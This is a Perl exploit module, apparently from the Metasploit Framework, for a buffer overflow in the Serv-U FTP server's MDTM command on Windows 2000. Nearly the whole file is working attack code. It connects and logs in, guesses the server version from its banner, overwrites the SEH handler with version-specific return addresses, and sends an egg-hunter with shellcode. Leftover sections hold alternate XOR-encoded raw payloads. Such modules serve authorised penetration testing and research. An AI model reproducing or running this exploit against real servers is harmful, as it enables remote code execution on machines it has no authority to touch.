package Msf::Exploit::servu_mdtm_overflow_cn;

use base "Msf::Exploit";
use strict;

my $advanced = {
  'SEHOffset'    => ['47', 'Offset from beginning of timezone to SEH'],
};
my $info =
{
  'Name'  => 'Serv-U FTPD MDTM Overflow',
  'Version'  => '2.0',
  'Authors' =>
    [
      'spoonm <ninjatools [at] hush.com>',
      'Based on: servu2.c lion <lion [at] cnhonker.net>',
    ],
  'Arch'  => [ 'x86' ],
  'OS'    => [ 'win2000', 'win32' ],
  'Priv'  => 0,
  'UserOpts'  =>
    {
      'RHOST' => [1, 'ADDR', 'The target address'],
      'RPORT' => [1, 'PORT', 'The target port', 21],
      'SSL'   => [0, 'BOOL', 'Use SSL'],
      'USER'  => [1, 'DATA', 'Username', 'anonymous'],
      'PASS'  => [1, 'DATA', 'Password', 'exploit\@metasploit.com'],
    },

  'Payload' =>
    {
      'Space'  => 1000,
      'BadChars'  => "\x00~+&=%\x0a\x0d\x20\x2f\x5c\x2e",
      'MinNops' => 0,
      'MaxNops' => 0,
    },
  
  'Description'  =>  "This exploits a buffer overflow in the Serv-U FTPD's MDTM command ".
                     "processing. This vulnerability was originally reported by bbkil ".
                     "and this module has been tested against version 4.0.4, 4.1.0, 4.1.3, ".
                     "and 5.0.0 on Windows 2000",
  
  'Refs'  => 
    [  
      'http://archives.neohapsis.com/archives/bugtraq/2004-02/0654.html',
    ],
  'Targets' =>
    [
      ['Auto Detect (31337)', ],
      ['Serv-U 4.0.0.4 ssleay.dll', 0x01476cc4],
      ['Serv-U 4.1.0.0/4.1.0.3 ssleay.dll', 0x012b77d7],
      ['Serv-U 4.1.0.0 ssleay.dll', 0x012b7752],
      ['Serv-U 4.1.0.3 ssleay.dll', 0x012b7b62],
      ['Serv-U 5.0.0.0 ssleay.dll', 0x013b8aff],
    ],
};

sub new {
  my $class = shift;
  my $self = $class->SUPER::new({'Info' => $info, 'Advanced' => $advanced}, @_);
  return($self);
}

sub Exploit {
  my $self = shift;
  my $targetHost  = $self->GetVar('RHOST');
  my $targetPort  = $self->GetVar('RPORT');
  my $targetIndex = $self->GetVar('TARGET');

  my $shellcode   = $self->GetVar('EncodedPayload')->Payload;

  my $sehOffset = $self->GetLocal('SEHOffset');
  my $jmpOver = "\x90\x90\xeb\x04";
  my $search = "\x83\xc4\xfc\x5f\xbe\x33\x33\x32\x31\x46\x47\x39\x37\x75\xfb\x46".
               "\x4f\x39\x77\xfc\x75\xfa\xff\xe7";


    my $s = Msf::Socket->new();

    if (! $s->Tcp($targetHost, $targetPort))
    {
        $self->PrintLine("[*] Could not connect to $targetHost:$targetPort.");
        return;
    }

    my $r = $s->Recv(-1, 20);
    if (! $r) { $self->PrintLine("[*] No response from FTP server"); return; }
    $self->PrintLine("[*] REMOTE> $r");
    $targetIndex = 2 if(!$targetIndex && $r =~ /v4\.1/);
    $targetIndex = 5 if(!$targetIndex && $r =~ /v5\.0/);
    
    $s->Send("USER " . $self->GetLocal('USER') . "\r\n");
    $r = $s->Recv(-1, 1);
    if (! $r) { $self->PrintLine("[*] No response from FTP server"); return; }
    $self->PrintLine("[*] REMOTE> $r");
    
    $s->Send("PASS " . $self->GetLocal('PASS') . "\r\n");
    $r = $s->Recv(-1, 1);
    if (! $r) { $self->PrintLine("[*] No response from FTP server"); return; }
    $self->PrintLine("[*] REMOTE> $r");

    if(!$targetIndex) {
      $s->Send("P\@SW\r\n");
      $r = $s->Recv(-1);
      if (! $r) { $self->PrintLine("[*] No response from FTP server"); return; }
      $self->PrintLine("[*] REMOTE> $r");
      if($r =~ /500/) {
        $targetIndex = 1;
      }
      else {
        $targetIndex = 2;
      }
    }
    
    my $target = $self->Targets->[$targetIndex];
    $self->PrintLine("[*] Trying to exploit target ". $target->[0]);

  # OK
  my $command = 'MDTM 20031111111111+' . ('A' x $sehOffset);

  # OK
  $command .= ($jmpOver . pack('V', $target->[1])) x 2;

#  $command .= 'AAAAAAAA';
  $command .= $search;
  $command .= ' /' . "\x35\x33\x32\x31" . $shellcode . "\x34\x33\x32\x31"  . "\r\n";

  
    

#    $s->Send("PORT 192,168,0,105,48,34\r\n");
#    $r = $s->Recv(-1, 1);
#    if (! $r) { $self->PrintLine("[*] No response from FTP server"); return; }
#    $self->PrintLine("[*] REMOTE> $r");
    
#    $s->Send("CWD /\r\n");
#    $r = $s->Recv(-1, 1);
#    if (! $r) { $self->PrintLine("[*] No response from FTP server"); return; }
#    $self->PrintLine("[*] REMOTE> $r");
    
#    $s->Send($command);
$s->Send($command);
    sleep(2);
    
    return;
}

sub xorr {
  my $shellcode = shift;
  for(my $i = 0; $i < length($shellcode); $i++) {
    substr($shellcode, $i, 1, chr(ord(substr($shellcode, $i, 1)) ^ 0x99));
  }
  return($shellcode);
}

__DATA__
$s->Send(
$command . 
"\x5e\x5f\x5b\xbe\x6d\x69\x6f\x6e\x4e\xbf\x6d\x69\x30".
"\x6e\x4f\x43\x39\x3b\x75\xfb\x4b\x80\x33\x99\x39\x73\xfc\x75\xf7".
"\xff\xd3\x20\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90".
"\x90\x90\x90\x6c\x69\x6f\x6e" . xorr($shellcode) . "li0n\r\n"
);

__DATA__
$s->Send(
"\x4d\x44\x54\x4d\x20\x32\x30\x30\x33\x31\x31\x31\x31\x31\x31\x31".
"\x31\x31\x31\x2b\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90".
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90".
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90".
"\x90\x90\x90\xeb\x06\xeb\x06\xff\x8a\x3b\x01\xeb\x06\xeb\x06\xff".
"\x8a\x3b\x01\x5e\x5f\x5b\xbe\x6d\x69\x6f\x6e\x4e\xbf\x6d\x69\x30".
"\x6e\x4f\x43\x39\x3b\x75\xfb\x4b\x80\x33\x99\x39\x73\xfc\x75\xf7".
"\xff\xd3\x20\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90".
"\x90\x90\x90\x6c\x69\x6f\x6e" . xorr($shellcode) . "li0n\r\n"
);

1;
